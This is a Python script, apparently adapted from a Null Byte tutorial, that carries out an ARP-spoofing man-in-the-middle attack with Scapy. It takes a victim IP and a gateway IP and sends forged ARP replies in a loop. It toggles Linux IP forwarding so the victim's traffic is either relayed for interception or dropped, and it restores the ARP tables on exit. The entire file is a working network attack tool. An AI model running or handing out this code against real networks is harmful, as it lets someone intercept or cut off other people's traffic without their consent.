# https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/
from scapy.all import *
import sys
import os
import time
import argparse
 
try:
        parser = argparse.ArgumentParser(description='MITM Attack')
        parser.add_argument('interface', help="Network interface to listen on i.e. en0", type=str)
        parser.add_argument('victim_ip', help="Capture X packets and exit", type=str)
        parser.add_argument('gate_ip', help="Capture X packets and exit", type=str)
        parser.add_argument('way', help="Specify 1 way or 2 way attack", type=str)
        args=parser.parse_args()

        interface = args.interface
        victim_ip = args.victim_ip
        gate_ip = args.gate_ip
        attack_way = args.way

except KeyboardInterrupt:
        print("\nUser Requested Shutdown")
        print("Exiting...")
        sys.exit(1)
 
if attack_way == '1':
        print("\nPreventing IP Forwarding...\n")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
else:
        print("\nEnabling IP Forwarding...\n")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
def get_mac(IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
        for snd,rcv in ans:
                return rcv.sprintf(r"%Ether.src%")
 
def re_arp():
       
        print("\nRestoring Targets...")
        victim_mac = get_mac(victim_ip)
        gate_mac = get_mac(gate_ip)
        send(ARP(op = 2, pdst = gate_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_mac), count = 7)
        send(ARP(op = 2, pdst = victim_ip, psrc = gate_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gate_mac), count = 7)
        print("Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("Shutting Down...")
        sys.exit(1)
 
def trick(gm, vm):
        send(ARP(op = 2, pdst = victim_ip, psrc = gate_ip, hwdst= vm))
        send(ARP(op = 2, pdst = gate_ip, psrc = victim_ip, hwdst= gm))
 
def mitm():
        try:
                victim_mac = get_mac(victim_ip)
        except Exception:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
                print("Couldn't Find Victim MAC Address")
                print("Exiting...")
                sys.exit(1)
        try:
                gate_mac = get_mac(gate_ip)
        except Exception:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
                print("Couldn't Find Gateway MAC Address")
                print("Exiting...")
                sys.exit(1)
        print("Poisoning Targets...")
        while 1:
                try:
                        trick(gate_mac, victim_mac)
                        time.sleep(1.5)
                except KeyboardInterrupt:
                        re_arp()
                        break
mitm()